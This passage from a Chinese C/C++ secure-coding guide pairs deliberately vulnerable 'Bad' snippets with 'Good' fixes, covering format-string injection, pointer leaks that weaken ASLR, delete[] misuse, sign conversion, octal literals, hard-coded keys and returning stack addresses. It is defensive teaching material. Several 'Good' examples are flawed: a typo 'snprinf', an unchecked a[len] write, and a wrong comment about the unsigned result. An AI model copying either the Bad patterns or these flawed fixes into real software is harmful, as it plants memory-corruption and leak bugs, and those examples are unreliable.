class="built_in">send_to_remote</span>(buffer_send_to_remote_client);</span><br></pre></td></tr></table></figure><p>正确示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Good</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> buf_size = <span class="number">1000</span>;</span><br><span class="line"><span class="type">char</span> buffer_send_to_remote_client[buf_size] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">snprintf</span>(buffer_send_to_remote_client, buf_size, <span class="string">&quot;%d: %s&quot;</span>, id, some_string);</span><br><span class="line"></span><br><span class="line">buffer_send_to_remote_client[buf_size - <span class="number">1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="built_in">send_to_remote</span>(buffer_send_to_remote_client);</span><br></pre></td></tr></table></figure><p>前者可能会让client的攻击者获取部分服务器的原始指针地址，可以用于破坏ASLR保护。</p><p>关联漏洞:</p><p><code>中风险-信息泄露</code></p><p><a id="1.1.5"></a></p><h4 id="1-5-【必须】防止泄露指针（包括-p）的值"><a href="#1-5-【必须】防止泄露指针（包括-p）的值" class="headerlink" title="1.5  【必须】防止泄露指针（包括%p）的值"></a>1.5  【必须】防止泄露指针（包括%p）的值</h4><p>所有printf系列函数，要防止格式化完的字符串泄露程序布局信息。例如，如果将带有%p的字符串泄露给程序，则可能会破坏ASLR的防护效果。使得攻击者更容易攻破程序。</p><p>%p的值只应当在程序内使用，而不应当输出到外部或被外部以某种方式获取。</p><p>错误示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad</span></span><br><span class="line"><span class="comment">// 如果这是暴露给客户的一个API：</span></span><br><span class="line"><span class="function"><span class="type">uint64_t</span> <span class="title">GetUniqueObjectId</span><span class="params">(<span class="type">const</span> Foo* pobject)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">uint64_t</span>)pobject;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正确示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Good</span></span><br><span class="line"><span class="type">uint64_t</span> g_object_id = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Foo::Foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>-&gt;object_id_ = g_object_id++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果这是暴露给客户的一个API：</span></span><br><span class="line"><span class="function"><span class="type">uint64_t</span> <span class="title">GetUniqueObjectId</span><span class="params">(<span class="type">const</span> Foo* object)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (object)</span><br><span class="line">    <span class="keyword">return</span> object-&gt;object_id_;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">error</span>(...);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关联漏洞:</p><p><code>中风险-信息泄露</code></p><p><a id="1.1.6"></a></p><h4 id="1-6-【必须】不应当把用户可修改的字符串作为printf系列函数的“format”参数"><a href="#1-6-【必须】不应当把用户可修改的字符串作为printf系列函数的“format”参数" class="headerlink" title="1.6  【必须】不应当把用户可修改的字符串作为printf系列函数的“format”参数"></a>1.6  【必须】不应当把用户可修改的字符串作为printf系列函数的“format”参数</h4><p>如果用户可以控制字符串，则通过 %n %p 等内容，最坏情况下可以直接执行任意恶意代码。</p><p>在以下情况尤其需要注意： WIFI名，设备名……</p><p>错误：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">snprintf</span>(buf, <span class="built_in">sizeof</span>(buf), wifi_name);</span><br></pre></td></tr></table></figure><p>正确：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">snprinf</span>(buf, <span class="built_in">sizeof</span>(buf), <span class="string">&quot;%s&quot;</span>, wifi_name);</span><br></pre></td></tr></table></figure><p>关联漏洞:</p><p><code>高风险-代码执行</code></p><p><code>高风险-内存破坏</code></p><p><code>中风险-信息泄露</code></p><p><code>低风险-拒绝服务</code></p><p><a id="1.1.7"></a></p><h4 id="1-7-【必须】对数组delete时需要使用delete"><a href="#1-7-【必须】对数组delete时需要使用delete" class="headerlink" title="1.7 【必须】对数组delete时需要使用delete[]"></a>1.7 【必须】对数组delete时需要使用delete[]</h4><p>delete []操作符用于删除数组。delete操作符用于删除非数组对象。它们分别调用operator delete[]和operator delete。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad</span></span><br><span class="line">Foo* b = <span class="keyword">new</span> Foo[<span class="number">5</span>];</span><br><span class="line"><span class="keyword">delete</span> b;  <span class="comment">// trigger assert in DEBUG mode</span></span><br></pre></td></tr></table></figure><p>在new[]返回的指针上调用delete将是取决于编译器的未定义行为。代码中存在对未定义行为的依赖是错误的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Good</span></span><br><span class="line">Foo* b = <span class="keyword">new</span> Foo[<span class="number">5</span>];</span><br><span class="line"><span class="keyword">delete</span>[] b;</span><br></pre></td></tr></table></figure><p>在 C++ 代码中，使用 <code>string</code>、<code>vector</code>、智能指针（比如<a href="https://zh.cppreference.com/w/cpp/memory/unique_ptr">std::unique_ptr&lt;T[]&gt;</a>）等可以消除绝大多数 <code>delete[]</code> 的使用场景，并且代码更清晰。</p><p>关联漏洞:</p><p><code>高风险-内存破坏</code></p><p><code>中风险-逻辑漏洞</code></p><p><code>低风险-内存泄漏</code></p><p><code>低风险-拒绝服务</code></p><p><a id="1.1.8"></a></p><h4 id="1-8【必须】注意隐式符号转换"><a href="#1-8【必须】注意隐式符号转换" class="headerlink" title="1.8【必须】注意隐式符号转换"></a>1.8【必须】注意隐式符号转换</h4><p>两个无符号数相减为负数时，结果应当为一个很大的无符号数，但是小于int的无符号数在运算时可能会有预期外的隐式符号转换。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> b = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (a - b &lt; <span class="number">0</span>)  <span class="comment">// a - b = -1 (signed int)</span></span><br><span class="line">  a = <span class="number">6</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  a = <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> b = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (a - b &lt; <span class="number">0</span>)  <span class="comment">// a - b = -1 (signed int)</span></span><br><span class="line">  a = <span class="number">6</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  a = <span class="number">8</span>;</span><br></pre></td></tr></table></figure><p>上述结果均为a&#x3D;6</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 3</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> b = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (a - b &lt; <span class="number">0</span>)  <span class="comment">// a - b = 0xffffffff (unsigned int)</span></span><br><span class="line">  a = <span class="number">6</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  a = <span class="number">8</span>;</span><br><span class="line">  </span><br><span class="line"><span class="comment">// 4</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> b = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (a - b &lt; <span class="number">0</span>)  <span class="comment">// a - b = 0xffffffff (unsigned int)</span></span><br><span class="line">  a = <span class="number">6</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  a = <span class="number">8</span>;</span><br></pre></td></tr></table></figure><p>上述结果均为a&#x3D;8</p><p>如果预期为8，则错误代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> b = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (a - b &lt; <span class="number">0</span>)  <span class="comment">// a - b = -1 (signed int)</span></span><br><span class="line">  a = <span class="number">6</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  a = <span class="number">8</span>;</span><br></pre></td></tr></table></figure><p>正确代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Good</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">short</span> b = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">int</span>)a - (<span class="type">unsigned</span> <span class="type">int</span>)b &lt; <span class="number">0</span>)  <span class="comment">// a - b = 0xffff (unsigned short)</span></span><br><span class="line">  a = <span class="number">6</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  a = <span class="number">8</span>;</span><br></pre></td></tr></table></figure><p>关联漏洞:</p><p><code>中风险-逻辑漏洞</code></p><p><a id="1.1.9"></a></p><h4 id="1-9【必须】注意八进制问题"><a href="#1-9【必须】注意八进制问题" class="headerlink" title="1.9【必须】注意八进制问题"></a>1.9【必须】注意八进制问题</h4><p>代码对齐时应当使用空格或者编辑器自带的对齐功能，谨慎在数字前使用0来对齐代码，以免不当将某些内容转换为八进制。</p><p>例如，如果预期为20字节长度的缓冲区，则下列代码存在错误。buf2为020（OCT）长度，实际只有16（DEC）长度，在memcpy后越界：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad</span></span><br><span class="line"><span class="type">char</span> buf1[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">char</span> buf2[<span class="number">0020</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(buf2, somebuf, <span class="number">19</span>);</span><br></pre></td></tr></table></figure><p>应当在使用8进制时明确注明这是八进制。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Good</span></span><br><span class="line"><span class="type">int</span> access_mask = <span class="number">0777</span>;  <span class="comment">// oct, rwxrwxrwx</span></span><br></pre></td></tr></table></figure><p>关联漏洞:</p><p><code>中风险-逻辑漏洞</code></p><p><a id="1.2"></a></p><h3 id="2-不推荐的编程习惯"><a href="#2-不推荐的编程习惯" class="headerlink" title="2 不推荐的编程习惯"></a>2 不推荐的编程习惯</h3><p><a id="1.2.1"></a></p><h4 id="2-1-【必须】switch中应有default"><a href="#2-1-【必须】switch中应有default" class="headerlink" title="2.1 【必须】switch中应有default"></a>2.1 【必须】switch中应有default</h4><p>switch中应该有default，以处理各种预期外的情况。这可以确保switch接受用户输入，或者后期在其他开发者修改函数后确保switch仍可以覆盖到所有情况，并确保逻辑正常运行。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Foo</span><span class="params">(<span class="type">int</span> bar)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> (bar &amp; <span class="number">7</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">Foobar</span>(bar);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">Foobar</span>(bar * <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例如上述代码switch的取值可能从0～7，所以应当有default：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Good</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Foo</span><span class="params">(<span class="type">int</span> bar)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> (bar &amp; <span class="number">7</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">Foobar</span>(bar);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">Foobar</span>(bar * <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关联漏洞:</p><p><code>中风险-逻辑漏洞</code></p><p><code>中风险-内存泄漏</code></p><p><a id="1.2.2"></a></p><h4 id="2-2-【必须】不应当在Debug或错误信息中提供过多内容"><a href="#2-2-【必须】不应当在Debug或错误信息中提供过多内容" class="headerlink" title="2.2 【必须】不应当在Debug或错误信息中提供过多内容"></a>2.2 【必须】不应当在Debug或错误信息中提供过多内容</h4><p>包含过多信息的Debug消息不应当被用户获取到。Debug信息可能会泄露一些值，例如内存数据、内存地址等内容，这些内容可以帮助攻击者在初步控制程序后，更容易地攻击程序。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Foo</span><span class="params">(<span class="type">int</span>* bar)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (bar &amp;&amp; *bar == <span class="number">5</span>) &#123;</span><br><span class="line">    <span class="built_in">OutputDebugInfoToUser</span>(<span class="string">&quot;Wrong value for bar %p = %d\n&quot;</span>, bar, *bar);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而应该：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Good</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">foo</span><span class="params">(<span class="type">int</span>* bar)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> DEBUG</span></span><br><span class="line">  <span class="keyword">if</span> (bar &amp;&amp; *bar == <span class="number">5</span>) &#123;</span><br><span class="line">    <span class="built_in">OutputDebugInfo</span>(<span class="string">&quot;Wrong value for bar.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关联漏洞:</p><p><code>中风险-信息泄漏</code></p><p><a id="1.2.3"></a></p><h4 id="2-3-【必须】不应该在客户端代码中硬编码对称加密秘钥"><a href="#2-3-【必须】不应该在客户端代码中硬编码对称加密秘钥" class="headerlink" title="2.3 【必须】不应该在客户端代码中硬编码对称加密秘钥"></a>2.3 【必须】不应该在客户端代码中硬编码对称加密秘钥</h4><p>不应该在客户端代码中硬编码对称加密秘钥。例如：不应在客户端代码使用硬编码的 AES&#x2F;ChaCha20-Poly1305&#x2F;SM1 密钥，使用固定密钥的程序基本和没有加密一样。</p><p>如果业务需求是认证加密数据传输，应优先考虑直接用 HTTPS 协议。</p><p>如果是其它业务需求，可考虑由服务器端生成对称秘钥，客户端通过 HTTPS 等认证加密通信渠道从服务器拉取。</p><p>或者根据用户特定的会话信息，比如登录认证过程可以根据用户名用户密码业务上下文等信息，使用 HKDF 等算法衍生出对称秘钥。</p><p>又或者使用 RSA&#x2F;ECDSA + ECDHE 等进行认证秘钥协商，生成对称秘钥。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad</span></span><br><span class="line"><span class="type">char</span> g_aes_key[] = &#123;...&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  ....</span><br><span class="line">  <span class="built_in">AES_func</span>(g_aes_key, input_data, output_data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以考虑在线为每个用户获取不同的密钥：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Good</span></span><br><span class="line"><span class="type">char</span>* g_aes_key;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Foo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  ....</span><br><span class="line">  <span class="built_in">AES_encrypt</span>(g_aes_key, input_data, output_data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  g_aes_key = <span class="built_in">get_key_from_https</span>(user_id, ...);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关联漏洞:</p><p><code>中风险-信息泄露</code></p><p><a id="1.2.4"></a></p><h4 id="2-4-【必须】返回栈上变量的地址"><a href="#2-4-【必须】返回栈上变量的地址" class="headerlink" title="2.4 【必须】返回栈上变量的地址"></a>2.4 【必须】返回栈上变量的地址</h4><p>函数不可以返回栈上的变量的地址，其内容在函数返回后就会失效。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad</span></span><br><span class="line"><span class="function"><span class="type">char</span>* <span class="title">Foo</span><span class="params">(<span class="type">char</span>* sz, <span class="type">int</span> len)</span></span>&#123;</span><br><span class="line">  <span class="type">char</span> a[<span class="number">300</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">if</span> (len &gt; <span class="number">100</span>) &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(a, sz, <span class="number">100</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  a[len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">  <span class="keyword">return</span> a;  <span class="comment">// WRONG</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而应当使用堆来传递非简单类型变量。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Good</span></span><br><span class="line"><span class="function"><span class="type">char</span>* <span class="title">Foo</span><span class="params">(<span class="type">char</span>* sz, <span class="type">int</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span>* a = <span class="keyword">new</span> <span class="type">char</span>[<span class="number">300</span>];</span><br><span class="line">    <span class="keyword">if</span> (len &gt; <span class="number">100</span>) &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(a, sz, <span class="number">100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    a[len] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> a;  <span class="comment">// OK</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于 C++ 程序来说，强烈建议返回 <code>string</code>、<code>vector</code> 等类型，会让代码更加简单和安全。</p><p>关联漏洞:</p><p><code>高风险-内存破坏</code></p><p><a id="1.2.5"></a></p><h4 id="2-5-【必须】有逻辑联系的数组必须仔细检查"><a href="#2-5-【必须】有逻辑联系的数组必须仔细检查" class="headerlink" title="2.5 【必须】有逻辑联系的数组必须仔细检查"></a>2.5 【必须】有逻辑联系的数组必须仔细检查</h4><p>例如下列程序将字符串转换为week day，但是两个数组并不一样长，导致程序可能会越界读一个int。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Bad</span></span><br><span class="line"><span class="type">int</span> nWeekdays[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>&#125;;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* sWeekdays[] = &#123;<span class="string">&quot;Mon&quot;</span>, <span class="string">&quot;Tue&quot;</span>, <span class="string">&quot;Wed&quot;</span>, <span class="string">&quot;Thu&quot;</span>, <span class="string">&quot;Fri&quot;</span>, <span class="string">&quot;Sat&quot;</span>, <span class="string">&quot;Sun&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> x = <span class="number">0</span>; x &lt; <span class="built_in">ARRAY_SIZE</span>(sWeekdays); x++) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(sWeekdays[x], input) == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> nWeekdays[x];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>应当确保有关联的nWeekdays和sWeekdays数据统一。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Good</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> nWeekdays[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>&#125;;</span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* sWeekdays[] = &#123;<span class="string">&quot;Mon&quot;</span>, <span class="string">&quot;Tue&quot;</span>, <span class="string">&quot;Wed&quot;</span>, <span class="string">&quot;Thu&quot;</span>, <span class="string">&quot;Fri&quot;</span>, <span class="string">&quot;Sat&quot;</span>, <span class="string">&quot;Sun&quot;</span>&#125;;</span><br><span class="line"><span class="built_in">assert</span>(<span class="built_in">ARRAY_SIZE</span>(nWeekdays) == <span class="built_in">ARRAY_SIZE</span>(sWeekdays));</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> x = <span class="number">0</span>; x &lt; <span class="built_in">ARRAY_SIZE</span>(sWeekdays); x++) &#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strcmp</span>(sWeekdays[x], input) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> nWeekdays[x];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关联漏洞:</p><p><code>高风险-内存破坏</code></p><p><a id="1.2.6"></a></p><h4 id="2-6-【必须】避免函数的声明和实现不同"><a href="#2-6-【必须】避免函数的声明和实现不同" class="headerlink" title="2.6 【必须】避免函数的声明和实现不同"></a>2.6 【必须】避免函数的声明和实现不同</h4><p>在头文件、源代码、文档中列举的函数声明应当一致，不应当出现定义内容错位的情况。</p><p>错误：</p><p>foo.h</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">CalcArea</span><span class="params">(<span class="type">int</span> width, <span class="type">int</span> height)</span></span>;</span><br></pre></td></tr></table></figure><p>foo.cc</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">CalcArea</span><span class="params">(<span class="type">int</span> height, <span class="type">int</span> width)</span> </span>&#123;  <span class="comment">// Different from foo.h</span></span><br><span class="line">  <span class="keyword">if</span> (height &gt; real_height) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> height * width;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>正确：<br>foo.h</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">CalcArea</span><span class="params">(<span class="type">int</span> height, <span class="type">int</span> width)</span></span>;</span><br></pre></td></tr></table></figure><p>foo.cc</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">CalcArea</span> <span class="params">(<span class="type">int</span> height, <span class="type">int</span> width)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (height &gt; real_height) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> height * width;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关联漏洞:</p><p><code>中风险-逻辑问题</code></p><p><a id="1.2.7"></a></p><h4 